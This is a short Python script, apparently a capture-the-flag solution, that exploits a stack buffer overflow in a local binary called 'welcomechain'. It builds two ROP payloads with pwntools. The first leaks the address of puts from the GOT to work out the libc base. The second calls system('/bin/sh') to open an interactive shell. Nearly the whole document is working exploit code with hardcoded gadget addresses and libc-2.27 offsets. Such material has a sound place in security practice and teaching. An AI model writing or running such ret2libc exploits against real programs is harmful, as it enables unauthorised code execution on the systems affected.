### use your libc addresses when you execute this code
from pwn import *

#context.log_level = 'debug'

is_remote = False

puts_plt = 0x4005a0
puts_got_plt = 0x601020
main_addr = 0x4007ba
pop_rdi_ret = 0x00400853
pop_rsi_r15_ret = 0x00400851
ret = 0x4007ec

### --- These are libc offset addresses of my environment, /lib/x86_64-linux-gnu/libc-2.27.so ---
puts_libc_offset = 0x809c0
system_libc_offset = 0x4f440
libc_binsh = 0x1b3e9a

def main():
	p = process('./welcomechain')

	payload_1 = b'A' * 0x28

	# puts libc address leak
	payload_1 += p64(pop_rdi_ret)
	payload_1 += p64(puts_got_plt)
	payload_1 += p64(puts_plt)
	payload_1 += p64(main_addr)

	p.recvuntil(b': ')
	p.sendline(payload_1)
	puts_libc = p.recvuntil(b'\x7f')[-6:]
	puts_libc = int.from_bytes(puts_libc, 'little')
	libc_base = puts_libc - puts_libc_offset
	log.info('libc base = %x' % libc_base)

	payload_2 = b'A' * 0x28

	# system('/bin/sh')
	payload_2 += p64(pop_rdi_ret)
	payload_2 += p64(libc_base + libc_binsh)
	payload_2 += p64(ret)
	payload_2 += p64(libc_base + system_libc_offset)

	p.recvuntil(b': ')
	p.sendline(payload_2)
	
	p.interactive()

if __name__=='__main__':
	main()